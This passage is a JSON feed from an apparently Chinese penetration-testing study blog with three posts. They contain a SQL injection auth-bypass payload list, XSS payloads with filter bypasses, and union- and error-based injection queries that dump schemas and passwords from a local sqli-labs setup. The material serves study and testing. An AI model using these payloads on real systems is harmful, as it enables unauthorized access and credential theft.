'INJ'||'ECT'||'XXX',2,3,4,5,6,7#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\n UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n</code></pre>\n<h2 id=\"sql-injection-auth-bypass-payloads\"><a class=\"anchor\" href=\"#sql-injection-auth-bypass-payloads\">#</a> SQL Injection Auth Bypass Payloads</h2>\n<pre><code>'-'\n' '\n'&amp;'\n'^'\n'*'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n&quot;-&quot;\n&quot; &quot;\n&quot;&amp;&quot;\n&quot;^&quot;\n&quot;*&quot;\n&quot; or &quot;&quot;-&quot;\n&quot; or &quot;&quot; &quot;\n&quot; or &quot;&quot;&amp;&quot;\n&quot; or &quot;&quot;^&quot;\n&quot; or &quot;&quot;*&quot;\nor true--\n&quot; or true--\n' or true--\n&quot;) or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n&quot; or &quot;x&quot;=&quot;x\n&quot;) or (&quot;x&quot;)=(&quot;x\n&quot;)) or ((&quot;x&quot;))=((&quot;x\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' #\nadmin'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin&quot; --\nadmin&quot; #\nadmin&quot;/*\nadmin&quot; or &quot;1&quot;=&quot;1\nadmin&quot; or &quot;1&quot;=&quot;1&quot;--\nadmin&quot; or &quot;1&quot;=&quot;1&quot;#\nadmin&quot; or &quot;1&quot;=&quot;1&quot;/*\nadmin&quot;or 1=1 or &quot;&quot;=&quot;\nadmin&quot; or 1=1\nadmin&quot; or 1=1--\nadmin&quot; or 1=1#\nadmin&quot; or 1=1/*\nadmin&quot;) or (&quot;1&quot;=&quot;1\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;--\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;#\nadmin&quot;) or (&quot;1&quot;=&quot;1&quot;/*\nadmin&quot;) or &quot;1&quot;=&quot;1\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;--\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;#\nadmin&quot;) or &quot;1&quot;=&quot;1&quot;/*\n1234 &quot; AND 1=0 UNION ALL SELECT &quot;admin&quot;, &quot;81dc9bdb52d04dc20036dbd8313ed055\n</code></pre>\n<h2 id=\"references\"><a class=\"anchor\" href=\"#references\">#</a> References :</h2>\n<ul>\n<li>SQL Injection ( OWASP )</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9u\">https://www.owasp.org/index.php/SQL_Injection</span></p>\n<ul>\n<li>Blind SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9CbGluZF9TUUxfSW5qZWN0aW9u\">https://www.owasp.org/index.php/Blind_SQL_Injection</span></p>\n<ul>\n<li>Testing for SQL Injection (OTG-INPVAL-005)</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9TUUxfSW5qZWN0aW9uXyhPVEctSU5QVkFMLTAwNSk=\">https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)</span></p>\n<ul>\n<li>SQL Injection Bypassing WAF</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9TUUxfSW5qZWN0aW9uX0J5cGFzc2luZ19XQUY=\">https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF</span></p>\n<ul>\n<li>Reviewing Code for SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9SZXZpZXdpbmdfQ29kZV9mb3JfU1FMX0luamVjdGlvbg==\">https://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection</span></p>\n<ul>\n<li>PL/SQL:SQL Injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9QTC9TUUw6U1FMX0luamVjdGlvbg==\">https://www.owasp.org/index.php/PL/SQL:SQL_Injection</span></p>\n<ul>\n<li>Testing for NoSQL injection</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9UZXN0aW5nX2Zvcl9Ob1NRTF9pbmplY3Rpb24=\">https://www.owasp.org/index.php/Testing_for_NoSQL_injection</span></p>\n<ul>\n<li>SQL Injection Injection Prevention Cheat Sheet</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9JbmplY3Rpb25fUHJldmVudGlvbl9DaGVhdF9TaGVldC5odG1s\">https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html</span></p>\n<ul>\n<li>SQL Injection Query Parameterization Cheat Sheet</li>\n</ul>\n<p>👉 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jaGVhdHNoZWV0c2VyaWVzLm93YXNwLm9yZy9jaGVhdHNoZWV0cy9RdWVyeV9QYXJhbWV0ZXJpemF0aW9uX0NoZWF0X1NoZWV0Lmh0bWw=\">https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html</span></p>\n",
            "tags": [
                "sql注入",
                "payload"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6XSS/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%88%9D%E5%AD%A6XSS/",
            "title": "初学XSS",
            "date_published": "2020-12-09T02:18:02.000Z",
            "content_html": "<h1 id=\"xss简介\"><a class=\"anchor\" href=\"#xss简介\">#</a> XSS 简介</h1>\n<p>XSS 攻击指黑客通过特殊的手段往网页中插入了恶意的 JavaScript 脚本，从而在用户浏览网页时，对用户浏览器发起 Cookie 资料窃取、会话劫持、钓鱼欺骗等各攻击。</p>\n<p>XSS 跨站脚本攻击本身对 Web 服务器没有直接危害，它借助网站进行传播，使网站的大量用户受到攻击。攻击者一般通过留言、电子邮件或其他途径向受害者发送一个精心构造的恶意 URL，当受害者在 Web 浏览器中打开该 URL 的时侯，恶意脚本会在受害者的计算机上悄悄执行。</p>\n<p>XSS 跨站脚本攻击漏洞也是 OWASP Top 10 中经常出现的对象，造成 XSS 漏洞普遍流行的原因如下:</p>\n<ol>\n<li>Web 浏览器本身的设计不安全，无法判断 JS 代码是否是恶意的</li>\n<li>输入与输出的 Web 应用程序基本交互防护不够</li>\n<li>程序员缺乏安全意识，缺少对 XSS 漏洞的认知</li>\n<li>XSS 触发简单，完全防御起来相当困难</li>\n</ol>\n<h1 id=\"小知识\"><a class=\"anchor\" href=\"#小知识\">#</a> 小知识</h1>\n<ol>\n<li>XSS 的存在，一定是伴随着输入，与输出 2 个概念的。</li>\n<li>要想过滤掉 XSS，你可以在输入层面过滤，也可以在输出层面过滤。</li>\n<li>如果输入和输出都没过滤。那么漏洞将是显而易见的。</li>\n</ol>\n<hr />\n<p>css 里，允许使用转义字符，\\+ascii16 进制形式。这样一来，我们就可以构造利用语句啦。</p>\n<hr />\n<p>在 HTML 属性中，会自动对实体字符进行转义。一个简单的比方。<br />\n&lt;imgsrc=&quot;1&quot;onerror=&quot;alert(1)&quot;&gt;<br />\n 和<br />\n &lt;imgsrc=&quot;1&quot;onerror=&quot;alert (1)&quot;&gt;<br />\n 是等效的</p>\n<hr />\n<h1 id=\"常见的payload\"><a class=\"anchor\" href=\"#常见的payload\">#</a> 常见的 payload</h1>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token string\">\">&lt;script>alert(1)&lt;/script>&lt;\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token string\">'>&lt;script>alert(1)&lt;/script>&lt;'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">></span><span class=\"token operator\">&lt;</span>script<span class=\"token operator\">></span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>script<span class=\"token operator\">></span><span class=\"token operator\">&lt;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token string\">\">&lt;script>alert(1)&lt;/script>&lt;\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token string\">\">&lt;ScrIPt>alert(1)&lt;/scriPt>&lt;\"</span> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token string\">\">&lt;ScrIPt>alert(1)&lt;/scriPt>&lt;\"</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token string\">\">&lt;scriscriptpt>alert(1)&lt;/scscriptriPt>&lt;\"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token string\">\">&lt;scriscriptpt>alert(1)&lt;/scscriptriPt>&lt;\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token string\">\">&lt;Script>alert(1)&lt;/Script>&lt;\"</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token string\">\">&lt;img src=x ONerror=alert(1)>&lt;\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token string\">\">&lt;a onclick=alert(1)>click me&lt;/a>&lt;\"</span>  <span class=\"token comment\">// 不过这个需要点击一下才能 xss，危害没有自动 xss 效果好</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token string\">\">&lt;a href=\"</span>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token string\">\">click me&lt;/a>&lt;\"</span>   <span class=\"token comment\">// 这里 href 里使用 javascript 伪协议声明后面的是 js 代码</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token string\">\">&lt;body onload=alert(1)>&lt;\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token string\">\">&lt;div onclick=\"</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xss'</span><span class=\"token punctuation\">)</span><span class=\"token string\">\">click me&lt;\"</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token string\">\">&lt;body onload=alert`1`>&lt;\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// 有时候用斜杠是可以代替空格的</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token string\">\">&lt;img/src='1'/onerror=alert`0`>&lt;\"</span> </pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token string\">\">&lt;&lt;svg/onload=alert`1`>&lt;\"</span>  </pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">//input 是有一个比较奇葩的 payload 的，那就是 </span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">&lt;</span>input type<span class=\"token operator\">=</span>image src<span class=\"token operator\">=</span>x onerror<span class=\"token operator\">=</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span> </pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token comment\">// 这个 payload 会把 input 当做 img 标签来用</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// 对单双引号进行了替换，替换为了对应的实体编码</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token comment\">// 然后判断了用户提交的 url 中是否含有 http://</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">// 用来验证提交的是否为 url</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token comment\">// 这里可以用 </span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>javascript<span class=\"token operator\">:</span><span class=\"token function\">alert</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token comment\">//http://</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token comment\">// 因为 javascript 中，// 是代表注释的意思</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">// 这样数据中含有 http:// 还不影响弹窗</span></pre></td></tr></table></figure><h1 id=\"xss平台\"><a class=\"anchor\" href=\"#xss平台\">#</a> XSS 平台</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly94cy5zYi94c3MucGhw\">https://xs.sb/xss.php</span></p>\n<p>这个挺不错的。</p>\n",
            "tags": [
                "xss"
            ]
        },
        {
            "id": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/",
            "url": "https://or0kit.github.io/PenetrationTest/Web-Security/%E5%86%8D%E5%AD%A6SQLinjection/",
            "title": "再学SQLinjection",
            "date_published": "2020-12-07T03:27:26.000Z",
            "content_html": "<p><img data-src=\"/images/bimg/%E9%98%BF%E5%B0%94%E7%93%A6%E6%8B%89%E8%BE%9B%EF%BC%8C%E8%A5%BF%E7%8F%AD%E7%89%99.jpg\" alt=\"\" /></p>\n<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>接着深入学习 SQL 注入。本文源自某位前辈的笔记，author：404</p>\n</blockquote>\n<h1 id=\"0x00-注入的产生\"><a class=\"anchor\" href=\"#0x00-注入的产生\">#</a> 0x00 注入的产生</h1>\n<ol>\n<li>\n<p>程序在开发的时候没对用户的数据过滤，把用户的数据都当做可信数据。</p>\n</li>\n<li>\n<p>过滤不严格。</p>\n</li>\n<li>\n<p>数据库配置不当。</p>\n</li>\n<li>\n<p>转义不当。</p>\n</li>\n</ol>\n<h1 id=\"0x01-注入的类型\"><a class=\"anchor\" href=\"#0x01-注入的类型\">#</a> 0x01 注入的类型</h1>\n<p>常见的注入我们可以归纳为数字型，字符型，搜索型，盲注等。</p>\n<pre><code>select * from admin where id = $id; //数字型 注入\n\nselect * from admin where id = '$id'; //字符型\n\nselect * from admin where id = &quot;$id&quot;;\n\nselect * from admin where id = ($id);\n\nselect * from admin where id = ('$id');\n\nselect * from admin where id = (&quot;$id&quot;);\n\nselect * from admin where username  like '%adm%';\n\nselect * from admin where username  like ('%adm%');\n\nselect * from admin where id = $id limit 0,1;\n\nselect * from admin order by $id;\n\nselect * from admin order by limit 0,1 $id;\n\nselect * from admin order by id limit 1,1 $id;\n\ninsert注入\n\nupdate注入\n\ndelete注入\n\n二次注入\n\n等等\n\n</code></pre>\n<p>实际环境中我们可能还会遇到更为复杂的 sql 注入语句，我们就要想办法闭合它。</p>\n<h1 id=\"0x03-寻找注入的一些注意\"><a class=\"anchor\" href=\"#0x03-寻找注入的一些注意\">#</a> 0x03 寻找注入的一些注意</h1>\n<p>如何寻找注入是一门艺术，黑盒测试它建立在对每个参数的 fuzz 上，当然如果你有开发经验，拿到一套程序就能敏锐的发现注入，<br />\n但凡涉及到用户交换地方都将是注入的重灾区，所以你可以适当的学习一下开发。</p>\n<ol>\n<li>\n<p>当网站为成熟的 cms 框架时不建议直接黑盒注入，可以直接审计源码，或者搜索漏洞。</p>\n</li>\n<li>\n<p>判断为自己开发的系统，目标不是很重要可以尝试使用 AWVS 等工具。</p>\n</li>\n<li>\n<p>信息收集的重要性，可能它的源码就在 GitHub 上，或者一个备份文件。</p>\n</li>\n</ol>\n<h1 id=\"0x00-数据库版本收集与路径\"><a class=\"anchor\" href=\"#0x00-数据库版本收集与路径\">#</a> 0x00 数据库版本收集与路径</h1>\n<p>识别数据库版本有助于我们进一步对数据库进行注入我们可以用到  <code>version()</code>   <code>@@version</code>   <code>/*!版本号*/</code></p>\n<p><code>/*!*/</code>  意为在 xxx 版本之上执行 我的版本是 5.6 所以可以执行</p>\n<pre><code>mysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,version(),3;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | admin    | admin    |\n|    1 | 5.6.30-1 | 3        |\n+------+----------+----------+\n2 rows in set (0.00 sec)\n\nmysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,@@version,3;\n+------+----------+----------+\n| id   | username | password |\n+------+----------+----------+\n|    1 | admin    | admin    |\n|    1 | 5.6.30-1 | 3        |\n+------+----------+----------+\n2 rows in set (0.01 sec)\n\nmysql&gt; SELECT * FROM admin WHERE id = 1 union select 1,/*!40000 user()*/,3;\n+------+----------------+----------+\n| id   | username       | password |\n+------+----------------+----------+\n|    1 | admin          | admin    |\n|    1 | root@localhost | 3        |\n+------+----------------+----------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<p>路径的话一般用 <code>@@datadir</code>  就可以了然后大概反猜下网站路径 操作系统  <code>@@version_compile_os</code></p>\n<h1 id=\"0x01-用户链接信息\"><a class=\"anchor\" href=\"#0x01-用户链接信息\">#</a> 0x01 用户，链接信息</h1>\n<p><code>system_user()</code>  // 系统用户名<br />\n <code>user()</code>  // 用户名<br />\n <code>current_user()</code>  // 当前用户名<br />\n <code>session_user()</code>  // 链接数据库的用户名</p>\n<pre><code>mysql&gt; select * from users where id =1 union select system_user(),session_user(),current_user();\n+--------------------+--------------------+----------+\n| id                 | username           | password |\n+--------------------+--------------------+----------+\n| 1                  | Dumb               | Dumb     |\n| root@192.168.1.101 | root@192.168.1.101 | root@%   |\n+--------------------+--------------------+----------+\n2 rows in set (0.00 sec)\n\n</code></pre>\n<p>读取 host 与 user</p>\n<pre><code>mysql&gt; select * from users where id =1 union select 1,host,user from mysql.user;\n+----+-----------+----------+\n| id | username  | password |\n+----+-----------+----------+\n|  1 | Dumb      | Dumb     |\n|  1 | %         | root     |\n|  1 | 127.0.0.1 | root     |\n|  1 | ::1       | root     |\n|  1 | localhost | root     |\n+----+-----------+----------+\n5 rows in set (0.00 sec)\n\n</code></pre>\n<h1 id=\"0x02-文末\"><a class=\"anchor\" href=\"#0x02-文末\">#</a> 0x02 文末</h1>\n<p>通过以上信息还能大概判断下是不是站库分离之类的</p>\n<h1 id=\"0x00-初识注入-bypass\"><a class=\"anchor\" href=\"#0x00-初识注入-bypass\">#</a> 0x00 初识注入 bypass</h1>\n<p>在 MySQL 里面注入和搭建环境来其实差不多，推荐使用 sqli-labs 来练练手，网上一堆的方法也是我们从学以来用到的</p>\n<p>加引号 报错  <code>and 1=1</code>   <code>and 1=2</code>  然后 SQLmap 一丢有 waf 就凉凉，可能 and 的时候就凉了，所以手工是也算个必修课吧。</p>\n<p>直接用  <code>and 1=1</code>  一类的多属于 数字型注入  <code>select * from admin where id = $id;</code>  被包裹起来的就不行的，所以<br />\n一般要看报错的语句，当然也不是加个引号没报错就没了，具体分很多情况的。（废话多了点顺便讲清楚吧）</p>\n<h1 id=\"0x01-第一个注入\"><a class=\"anchor\" href=\"#0x01-第一个注入\">#</a> 0x01 第一个注入</h1>\n<p>and 是一个逻辑符号 要求两边同时成立，所以 and 这边是什么可以尽情发挥大家的才能 比如 and true=1 ？，为什么要这么写，因为某狗判断的就是 and 这边的字符类型<br />\n大家可以去了解了解 MySQL 隐式转化。</p>\n<pre><code>mysql&gt; select * from users where id = &quot;1&quot; and 1=1;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | Dumb     | Dumb     |\n+----+----------+----------+\n1 row in set (0.00 sec)\n\nmysql&gt; select * from users where id = &quot;1&quot; and 1=2;\nEmpty set (0.00 sec)\n\n</code></pre>\n<p>说了这么多我们就拿 sqli-labs 的第一关来演示一下</p>\n<p><img data-src=\"1.6.1.png\" alt=\"mysql\" /></p>\n<p>看到报错语句</p>\n<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1\n\n</code></pre>\n<p>其中 <code>''1'' LIMIT 0,1'</code>  最外层的是它出错给你的字符串不用看，所以为 <code>'1'' LIMIT 0,1</code>  应为我们的单引号没闭合所以造成了出错 同时知道了 它的后面有个  <code>LIMIT 0,1</code>  所以反推大概的语句为  <code>select x,x from xxx where x='id' limit 0,1</code>  看到报错信息我们应该要能反推它的语句，有利于我们进一步注入，下面使用联合注入。</p>\n<p>首先都是老套路  <code>order by xx</code>  来判断它的列数，因为  <code>order by</code>  是根据列来排序的 （排序第几列）</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,schema_name,3 from information_schema.schemata limit 2,1 -- +\n\n</code></pre>\n<p>通过 limit 0,1 来控制前端的显位的数据 (从第 0 条取一条) 如果是过滤逗号 。 想用分页可以使用  <code>1 offset 1</code>  意思是从第 1 条开始选一条当然还有 join 分页这些都在后面讲了。</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' -- +\n</code></pre>\n<p>当然你想直接爆当前的库的表 不妨这样写  <code>table_schema=database()</code>  为了避免单引号你也可以使用 hex 后的数据  <code>table_schema=0x7365637572697479</code></p>\n<p>使用 <code>group_concat()</code>  函数把表名都聚合起来，更加方便。</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 -- +\n</code></pre>\n<p>爆出字段</p>\n<pre><code>http://127.0.0.1/sqli/Less-1/?id=-2' union select 1,group_concat(username,0x7C,password),3 from users-- +\n\n</code></pre>\n<p>爆出数据 在  <code>group_concat()</code>  被过滤的情况下我们可以使用其他的来替换 推荐大家查阅 mysql 函数表</p>\n<p>当我们使用  <code>information_schema.schemata</code>  时被拦截了，我们可以这样绕过</p>\n<pre><code>\n`information_schema`.`schemata `\ninformation_schema/**/.schemata\ninformation_schema/*!*/.schemata\ninformation_schema%0a.schemata\n\n</code></pre>\n<p>也有人遇到过这种情况 users 表被拦截 怎么绕过呢，其实也一样</p>\n<pre><code>security.users 数据库名 加表名\n\nsecurity.`users`\n\n</code></pre>\n<h1 id=\"0x00-报错注入\"><a class=\"anchor\" href=\"#0x00-报错注入\">#</a> 0x00 报错注入</h1>\n<p>报错注入在我们不能联合注入的时候也是非常重要的网上给我们提供了很多中报错注入 这里直接引用<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd29jYWxpZXNoZW5tZWd1aS9wLzU5MTc5NjcuaHRtbA==\"> https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</span> 一文了</p>\n<pre><code>1.floor()\n\nselect * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n\n2.extractvalue()\n\nselect * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));\n\n\n3.updatexml()\n\nselect * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));\n\n\n4.geometrycollection()\n\nselect * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));\n\n\n5.multipoint()\n\nselect * from test where id=1 and multipoint((select * from(select * from(select user())a)b));\n\n\n6.polygon()\n\nselect * from test where id=1 and polygon((select * from(select * from(select user())a)b));\n\n\n7.multipolygon()\n\nselect * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));\n\n\n8.linestring()\n\nselect * from test where id=1 and linestring((select * from(select * from(select user())a)b));\n\n\n9.multilinestring()\n\nselect * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));\n\n10.exp()\n\nselect * from test where id=1 and exp(~(select * from(select user())a));\n\n</code></pre>\n<p>每个一个报错语句都有它的原理 比如  <code>exp()</code>  报错的原理，手册说到 exp 是一个数学函数 取 e 的 x 次方，当我们输入的值大于 709 就会报错 然后～取反它的值总会大于 709 所以报错。</p>\n<p>简单的用报错语句来注入一下把这里我就利用函数  <code>updatexml()</code></p>\n<pre><code>updatexml (XML_document, XPath_string, new_value); \nXML_document: 是String格式，为XML文档对象的名称，文中为Doc \nXPath_string : Xpath\nnew_value :String格式，替换查找到的符合条件的数据 \n\n</code></pre>\n<p>其中关键点就是 <code>XPath_string</code>  这块了 因为我们传入的的不是 <code>XPath_string</code> , 为什么要使用 <code>concat</code>  这个函数呢，因为它是个连接函数你不用的话 <code>(updatexml(1,(select user()),1))</code>  这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到 <code>concat</code>  用特殊字符给他连接起来。</p>\n<pre><code>爆库：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (schema_name),0x7e) FROM information_schema.schemata limit 2,1),1) -- +\n\n爆表：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (table_name),0x7e) from information_schema.tables where table_schema='security' limit 3,1),1) -- +\n\n爆字段：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, (column_name),0x7e) from information_schema.columns where table_name=0x7573657273 limit 2,1),1) -- +\n\n爆数据：\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,(select concat(0x7e, password,0x7e) from users limit 1,1),1) -- +\n\n\n\n</code></pre>\n<p>在报错里面直接使用 MySQL 最基本的查表就可以了，你也可以把 concat 放在外面  <code>updatexml(1,concat(0x7e, (select password from users limit 1,1),0x7e),1)</code></p>\n<p>自己灵活多变，这里我值得注意的是它加了连接字符 md5 只能爆出 31 位，你可以用分割函数分割出来。</p>\n<pre><code>substr(string string,num start,num length);\n\nstring为字符串\n\nstart为起始位置\n\nlength为长度\n\nhttp://127.0.0.1/sqli/Less-1/?id=1' and updatexml(1,concat(0x7e, substr((select md5(password) from users limit 1,1),1,16),0x7e),1) -- +\n\n\n\n</code></pre>\n<p>因为我密码不是 md5 的 所以我加了个密来分割。</p>\n<h1 id=\"0x00-盲注\"><a class=\"anchor\" href=\"#0x00-盲注\">#</a> 0x00 